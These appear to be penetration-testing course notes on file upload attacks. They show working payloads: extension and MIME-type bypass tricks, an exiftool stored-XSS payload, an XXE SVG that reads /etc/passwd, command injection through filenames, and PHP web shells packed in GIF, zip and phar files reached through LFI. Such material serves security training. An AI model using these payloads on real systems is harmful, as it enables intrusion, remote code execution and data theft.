## Client-Side Validation
To bypass these protections, we can either `modify the upload request to the back-end server`, or we can `manipulate the front-end code to disable these type validations`.
## Back-end Request Modification
We may modify the filename in the request and modify the content to the web shell. 
We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.
## Disabling Front-end Validation
Another method to bypass client-side validations is through manipulating the front-end code. As these functions are being completely processed within our web browser, we have complete control over them.

# Blacklisting Extensions
The weakest form of validation amongst these is `testing the file extension against a blacklist of extension` to determine whether the upload request should be blocked.
## Fuzzing Extensions
We can fuzz the extensions on the filename of the file we want to upload.
# Whitelist Filters
## Double Extensions
The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through `Double Extensions`. For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.
## Reverse Double Extension
In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a file upload functionality.
For example, the file name (`shell.php.jpg`) should pass the whitelist test as it ends with (`.jpg`), and it would be able to execute PHP code due to the misconfiguration, as it contains (`.php`) in its name.
## Character Injection
The following are some of the characters we may try injecting:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `â€¦`
- `:`
Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist.
The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.

## Type Filters
## Content-Type
Our browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the file extension. However, since our browsers set this, this operation is a client-side operation, and we can manipulate it to change the perceived file type and potentially bypass the type filter.

We may start by fuzzing the Content-Type header with SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to `45` types only (compared to around 700 originally). We can do so as follows:

```shell
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```
## MIME-Type
The second and more common type of file content validation is testing the uploaded file's `MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its general format and bytes structure.
This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image, while a file starting with plaintext is usually considered a `Text` file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.
## Limited File Uploads
Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server. So, let's explore some of these attacks.
## XSS
Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.
For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:

```shell
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```
Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload.

## XXE
Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source.

## DoS

Finally, many file upload vulnerabilities may lead to a `Denial of Service (DOS)` attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks, as discussed in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

Furthermore, we can utilize a `Decompression Bomb` with file types that use data compression, like `ZIP` archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.

Another possible DoS attack is a `Pixel Flood` attack with some image files that utilize image compression, like `JPG` or `PNG`. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

In addition to these attacks, we may try a few other methods to cause a DoS on the back-end server. One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.

If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. `../../../etc/passwd`), which may also cause the server to crash. `Try to search for other examples of DOS attacks through a vulnerable file upload functionality`.

## Other Upload Attacks
## Injections in File Name
A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution.
Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them.
## Upload Directory Disclosure
In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section.
## Windows-specific Attacks
One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.
## Advanced File Upload Attacks
Some commonly used libraries may have public exploits for such vulnerabilities, like the AVI upload vulnerability leading to XXE in `ffmpeg`. However, when dealing with custom code and custom libraries, detecting such vulnerabilities requires more advanced knowledge and techniques, which may lead to discovering an advanced file upload vulnerability in some web applications.

#### Crafting Malicious Image

```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
Once we've uploaded our file, all we need to do is include it through the LFI vulnerability.
## Zip Upload
We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code.
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded).
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Phar Upload
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
```shell
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`).
